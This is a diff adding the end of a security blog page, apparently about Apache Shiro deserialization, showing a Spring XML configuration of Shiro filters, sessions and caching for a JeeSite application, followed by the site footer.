+  <span class="na">xmlns:context=</span><span class="s">"http://www.springframework.org/schema/context"</span> <span class="na">xsi:schemaLocation=</span><span class="s">"
+    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
+    http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context-4.0.xsd"</span>
+  <span class="na">default-lazy-init=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+
+  <span class="nt">&lt;description&gt;</span>Shiro Configuration<span class="nt">&lt;/description&gt;</span>
+
+    <span class="c">&lt;!-- 加载配置属性文件 --&gt;</span>
+  <span class="nt">&lt;context:property-placeholder</span> <span class="na">ignore-unresolvable=</span><span class="s">"true"</span> <span class="na">location=</span><span class="s">"classpath:jeesite.properties"</span> <span class="nt">/&gt;</span>
+  
+  <span class="c">&lt;!-- Shiro权限过滤过滤器定义 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">name=</span><span class="s">"shiroFilterChainDefinitions"</span> <span class="na">class=</span><span class="s">"java.lang.String"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;constructor-arg&gt;</span>
+      <span class="nt">&lt;value&gt;</span>
+        /static/** = anon
+        /userfiles/** = anon
+        ${adminPath}/cas = cas
+        ${adminPath}/login = authc
+        ${adminPath}/isValidateKlp = anon
+        ${adminPath}/queryLoingname = anon
+        ${adminPath}/ukeyIsExist = anon
+        ${adminPath}/validSlider/** = anon
+        ${adminPath}/dataInterface/** = anon
+        ${adminPath}/sys/forget/** = anon<span class="c">&lt;!-- 登录页忘记密码 --&gt;</span>
+        ${adminPath}/logout = logout
+        ${adminPath}/** = user
+        /act/rest/service/editor/** = perms[act:model:edit]
+        /act/rest/service/model/** = perms[act:model:edit]
+        /act/rest/service/** = user
+        /ReportServer/** = user
+        
+        ${mobilePath}/** = anon
+      <span class="nt">&lt;/value&gt;</span>
+    <span class="nt">&lt;/constructor-arg&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 安全认证过滤器 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"shiroFilter"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"securityManager"</span> <span class="na">ref=</span><span class="s">"securityManager"</span> <span class="nt">/&gt;</span><span class="c">&lt;!-- 
+    &lt;property name="loginUrl" value="${cas.server.url}?service=${cas.project.url}${adminPath}/cas" /&gt; --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"loginUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}/login"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"successUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}?login"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"filters"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;map&gt;</span>
+                <span class="nt">&lt;entry</span> <span class="na">key=</span><span class="s">"cas"</span> <span class="na">value-ref=</span><span class="s">"casFilter"</span><span class="nt">/&gt;</span>
+                <span class="nt">&lt;entry</span> <span class="na">key=</span><span class="s">"authc"</span> <span class="na">value-ref=</span><span class="s">"formAuthenticationFilter"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/map&gt;</span>
+        <span class="nt">&lt;/property&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"filterChainDefinitions"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;ref</span> <span class="na">bean=</span><span class="s">"shiroFilterChainDefinitions"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/property&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- CAS认证过滤器 --&gt;</span>  
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"casFilter"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.cas.CasFilter"</span><span class="nt">&gt;</span>  
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"failureUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}/login"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 定义Shiro安全管理配置 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"securityManager"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.web.mgt.DefaultWebSecurityManager"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"realm"</span> <span class="na">ref=</span><span class="s">"systemAuthorizingRealm"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionManager"</span> <span class="na">ref=</span><span class="s">"sessionManager"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"cacheManager"</span> <span class="na">ref=</span><span class="s">"shiroCacheManager"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 自定义会话管理配置 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionManager"</span> <span class="na">class=</span><span class="s">"com.thinkgem.jeesite.common.security.shiro.session.SessionManager"</span><span class="nt">&gt;</span> 
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionDAO"</span> <span class="na">ref=</span><span class="s">"sessionDAO"</span><span class="nt">/&gt;</span>
+    
+    <span class="c">&lt;!-- 会话超时时间，单位：毫秒  --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"globalSessionTimeout"</span> <span class="na">value=</span><span class="s">"${session.sessionTimeout}"</span><span class="nt">/&gt;</span>
+    
+    <span class="c">&lt;!-- 定时清理失效会话, 清理用户直接关闭浏览器造成的孤立会话   --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionValidationInterval"</span> <span class="na">value=</span><span class="s">"${session.sessionTimeoutClean}"</span><span class="nt">/&gt;</span>
+<span class="c">&lt;!--      &lt;property name="sessionValidationSchedulerEnabled" value="false"/&gt; --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionValidationSchedulerEnabled"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdCookie"</span> <span class="na">ref=</span><span class="s">"sessionIdCookie"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdCookieEnabled"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 指定本系统SESSIONID, 默认为: JSESSIONID 问题: 与SERVLET容器名冲突, 如JETTY, TOMCAT 等默认JSESSIONID,
+    当跳出SHIRO SERVLET时如ERROR-PAGE容器会为JSESSIONID重新分配值导致登录会话丢失! --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionIdCookie"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.web.servlet.SimpleCookie"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;constructor-arg</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">value=</span><span class="s">"jeesite.session.id"</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"path"</span> <span class="na">value=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+
+  <span class="c">&lt;!-- 自定义Session存储容器 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionDAO"</span> <span class="na">class=</span><span class="s">"com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdGenerator"</span> <span class="na">ref=</span><span class="s">"idGen"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionKeyPrefix"</span> <span class="na">value=</span><span class="s">"${redis.keyPrefix}:user:session_"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span> 
+  <span class="c">&lt;!--&lt;bean id="sessionDAO" class="com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO"&gt;
+    &lt;property name="sessionIdGenerator" ref="idGen" /&gt;
+    &lt;property name="activeSessionsCacheName" value="activeSessionsCache" /&gt;
+    &lt;property name="cacheManager" ref="shiroCacheManager" /&gt;
+  &lt;/bean&gt;--&gt;</span>
+  
+  <span class="c">&lt;!-- 定义授权缓存管理器 --&gt;</span>
+<span class="c">&lt;!--  &lt;bean id="shiroCacheManager" class="com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager" /&gt; --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"shiroCacheManager"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.cache.ehcache.EhCacheManager"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"cacheManager"</span> <span class="na">ref=</span><span class="s">"cacheManager"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 保证实现了Shiro内部lifecycle函数的bean执行 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"lifecycleBeanPostProcessor"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.LifecycleBeanPostProcessor"</span><span class="nt">/&gt;</span>
+  
+  <span class="c">&lt;!-- AOP式方法级权限检查  --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"</span> <span class="na">depends-on=</span><span class="s">"lifecycleBeanPostProcessor"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"proxyTargetClass"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"securityManager"</span> <span class="na">ref=</span><span class="s">"securityManager"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+<span class="nt">&lt;/beans&gt;</span>
+</code></pre></div></div>
+
+<p>以上。</p>
+
+						<div class="spacing"></div>
+						<footer>
+	<div class="hline"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/about/ShiroDeser/" target="_blank" class=" text-bold">
+						<svg aria-hidden="true" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+							<path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/Bin4xin" class=" text-bold">
+						<svg aria-hidden="true" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible"><path fill-rule="evenodd" d="M1.5 2.75a.25.25 0 01.25-.25h8.5a.25.25 0 01.25.25v5.5a.25.25 0 01-.25.25h-3.5a.75.75 0 00-.53.22L3.5 11.44V9.25a.75.75 0 00-.75-.75h-1a.25.25 0 01-.25-.25v-5.5zM1.75 1A1.75 1.75 0 000 2.75v5.5C0 9.216.784 10 1.75 10H2v1.543a1.457 1.457 0 002.487 1.03L7.061 10h3.189A1.75 1.75 0 0012 8.25v-5.5A1.75 1.75 0 0010.25 1h-8.5zM14.5 4.75a.25.25 0 00-.25-.25h-.5a.75.75 0 110-1.5h.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0114.25 12H14v1.543a1.457 1.457 0 01-2.487 1.03L9.22 12.28a.75.75 0 111.06-1.06l2.22 2.22v-2.19a.75.75 0 01.75-.75h1a.25.25 0 00.25-.25v-5.5z"></path></svg>
+						Post by Bin4xin.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">其他</h2>
+				<div>
+					<a class="text-bold" target="_blank" href="https://bin4xin.github.io">HOME ·</a>
+					<a class="text-bold" target="_blank" href="">镜像 ·</a>
+					<a class="text-bold" target="_blank" href="https://bin4xin.github.io/blog">博客 ·</a>
+					<a class="text-bold" target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki">WIKI</a>
+				</div>
+			</div>
+			<div class="col-xs-4 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a class="btn mr-1 color-border-accent-emphasis" href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" title="给文档仓库点个赞!">
+					<svg aria-hidden="true" role="img" class="color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+						<path fill-rule="evenodd" d="M8.834.066C7.494-.087 6.5 1.048 6.5 2.25v.5c0 1.329-.647 2.124-1.318 2.614-.328.24-.66.403-.918.508A1.75 1.75 0 002.75 5h-1A1.75 1.75 0 000 6.75v7.5C0 15.216.784 16 1.75 16h1a1.75 1.75 0 001.662-1.201c.525.075 1.067.229 1.725.415.152.043.31.088.475.133 1.154.32 2.54.653 4.388.653 1.706 0 2.97-.153 3.722-1.14.353-.463.537-1.042.668-1.672.118-.56.208-1.243.313-2.033l.04-.306c.25-1.869.265-3.318-.188-4.316a2.418 2.418 0 00-1.137-1.2C13.924 5.085 13.353 5 12.75 5h-1.422l.015-.113c.07-.518.157-1.17.157-1.637 0-.922-.151-1.719-.656-2.3-.51-.589-1.247-.797-2.01-.884zM4.5 13.3c.705.088 1.39.284 2.072.478l.441.125c1.096.305 2.334.598 3.987.598 1.794 0 2.28-.223 2.528-.549.147-.193.276-.505.394-1.07.105-.502.188-1.124.295-1.93l.04-.3c.25-1.882.189-2.933-.068-3.497a.922.922 0 00-.442-.48c-.208-.104-.52-.174-.997-.174H11c-.686 0-1.295-.577-1.206-1.336.023-.192.05-.39.076-.586.065-.488.13-.97.13-1.328 0-.809-.144-1.15-.288-1.316-.137-.158-.402-.304-1.048-.378C8.357 1.521 8 1.793 8 2.25v.5c0 1.922-.978 3.128-1.933 3.825a5.861 5.861 0 01-1.567.81V13.3zM2.75 6.5a.25.25 0 01.25.25v7.5a.25.25 0 01-.25.25h-1a.25.25 0 01-.25-.25v-7.5a.25.25 0 01.25-.25h1z">
+						</path>
+					</svg>
+				</a>
+				<a class="btn mr-1 color-border-accent-emphasis" href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=comment&title=ShiroDeser | © 哨兵 | Sentry CyberSecurity&permalink=https://bin4xin.sentrylab.cn/about/ShiroDeser/" target="_blank" title="本文档有问题?">
+				<svg aria-hidden="true" role="img" class="color-fg-muted" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+					<path fill-rule="evenodd" d="M7.083 15.986c1.34.153 2.334-.982 2.334-2.183v-.5c0-1.329.646-2.123 1.317-2.614.329-.24.66-.403.919-.508a1.75 1.75 0 001.514.872h1a1.75 1.75 0 001.75-1.75v-7.5a1.75 1.75 0 00-1.75-1.75h-1a1.75 1.75 0 00-1.662 1.2c-.525-.074-1.068-.228-1.726-.415L9.305.705C8.151.385 6.765.053 4.917.053c-1.706 0-2.97.152-3.722 1.139-.353.463-.537 1.042-.669 1.672C.41 3.424.32 4.108.214 4.897l-.04.306c-.25 1.869-.266 3.318.188 4.316.244.537.622.943 1.136 1.2.495.248 1.066.334 1.669.334h1.422l-.015.112c-.07.518-.157 1.17-.157 1.638 0 .921.151 1.718.655 2.299.512.589 1.248.797 2.011.884zm4.334-13.232c-.706-.089-1.39-.284-2.072-.479a63.914 63.914 0 00-.441-.125c-1.096-.304-2.335-.597-3.987-.597-1.794 0-2.28.222-2.529.548-.147.193-.275.505-.393 1.07-.105.502-.188 1.124-.295 1.93l-.04.3c-.25 1.882-.19 2.933.067 3.497a.921.921 0 00.443.48c.208.104.52.175.997.175h1.75c.685 0 1.295.577 1.205 1.335-.022.192-.049.39-.075.586-.066.488-.13.97-.13 1.329 0 .808.144 1.15.288 1.316.137.157.401.303 1.048.377.307.035.664-.237.664-.693v-.5c0-1.922.978-3.127 1.932-3.825a5.862 5.862 0 011.568-.809V2.754zm1.75 6.798a.25.25 0 01-.25-.25v-7.5a.25.25 0 01.25-.25h1a.25.25 0 01.25.25v7.5a.25.25 0 01-.25.25h-1z"></path></svg>
+				</a>
+			</div>
+		</section>
+</footer>
+					</div>
+				</div><!--page main content end-->
+			</div><!--grid content display end-->
+		</div>
+	</div>
+</div><!--/pages -->
+<script>
+// help-content
+</script>
+<!--
+vim: ts=2 sts=2 sw=2 noexpandtab
+-->
+</div>
+    </startprint2pdfs>
+</body>
+
+<script src="/assets/js/copy.js"></script>
+<style>
+
+</style>
+
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-0 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
+
